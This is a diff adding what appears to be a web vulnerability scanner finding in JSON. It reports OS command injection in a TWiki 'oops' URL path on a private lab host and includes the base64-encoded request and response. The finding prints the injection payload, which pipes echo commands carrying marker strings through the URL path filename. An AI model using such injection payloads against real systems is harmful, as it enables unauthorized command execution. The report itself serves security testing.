@@ -1,0 +1,78 @@
+{
+  "name": "OS command injection",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Firm",
+  "host": "",
+  "path": "/twiki/bin/oops/Main/WebHome",
+  "url": "/twiki/bin/oops/Main/WebHome",
+  "evidence": [
+    {
+      "type": "FirstOrderEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "fGVjaG8gaWY0MGN4c2xvbyAxN3lpc2RmcTRofHxhICMnIHxlY2hvIGlmNDBjeHNsb28gMTd5aXNkZnE0aHx8YSAjfCIgfGVjaG8gaWY0MGN4c2xvbyAxN3lpc2RmcTRofHxhICM=",
+          "flags": 1
+        },
+        "band_flags": [
+          "in_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://192.168.1.50/twiki/bin/oops/Main/WebHome%7cecho%20if40cxsloo%2017yisdfq4h%7c%7ca%20%23'%20%7cecho%20if40cxsloo%2017yisdfq4h%7c%7ca%20%23%7c%22%20%7cecho%20if40cxsloo%2017yisdfq4h%7c%7ca%20%23?template=oopsmore&param1=1.20&param2=1.20",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC90d2lraS9iaW4vb29wcy9NYWluL1dlYkhvbWU=",
+            "length": 32
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "JTdjZWNobyUyMGlmNDBjeHNsb28lMjAxN3lpc2RmcTRoJTdjJTdjYSUyMCUyMyclMjAlN2NlY2hvJTIwaWY0MGN4c2xvbyUyMDE3eWlzZGZxNGglN2MlN2NhJTIwJTIzJTdjJTIyJTIwJTdjZWNobyUyMGlmNDBjeHNsb28lMjAxN3lpc2RmcTRoJTdjJTdjYSUyMCUyMw==",
+            "length": 151
+          },
+          {
+            "type": "DataSegment",
+            "data": "P3RlbXBsYXRlPW9vcHNtb3JlJnBhcmFtMT0xLjIwJnBhcmFtMj0xLjIwIEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWUNCkNvbnRlbnQtTGVuZ3RoOiAwDQoNCg==",
+            "length": 784
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE0OjQwOjAwIEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNzQyOA0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
+            "length": 379
+          },
+          {
+            "type": "SnipSegment",
+            "length": 1335
+          },
+          {
+            "type": "DataSegment",
+            "data": "PC9hPiA=",
+            "length": 5
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "aWY0MGN4c2xvbyAxN3lpc2RmcTRo",
+            "length": 21
+          },
+          {
+            "type": "DataSegment",
+            "data": "YSAjIGVjaG8gaWY0MGN4c2xvbyAxN3lpc2RmcTRoYSAjIGVjaG8gaWY0MGN4c2xvbyAxN3lpc2RmcTRoYSAjIDwvaDE+",
+            "length": 69
+          },
+          {
+            "type": "SnipSegment",
+            "length": 5798
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "1756824011757"
+      }
+    }
+  ],
+  "description": "The URL path filename appears to be vulnerable to OS command injection attacks. It is possible to use the pipe character (|) to inject arbitrary OS commands and retrieve the output in the application's responses.<br><br>The payload <b>|echo if40cxsloo 17yisdfq4h||a #' |echo if40cxsloo 17yisdfq4h||a #|\" |echo if40cxsloo 17yisdfq4h||a #</b> was submitted in the URL path filename. The application's response appears to contain the output from the injected command, indicating that the command was executed.",
+  "remediation": "",
+  "references": []
+}
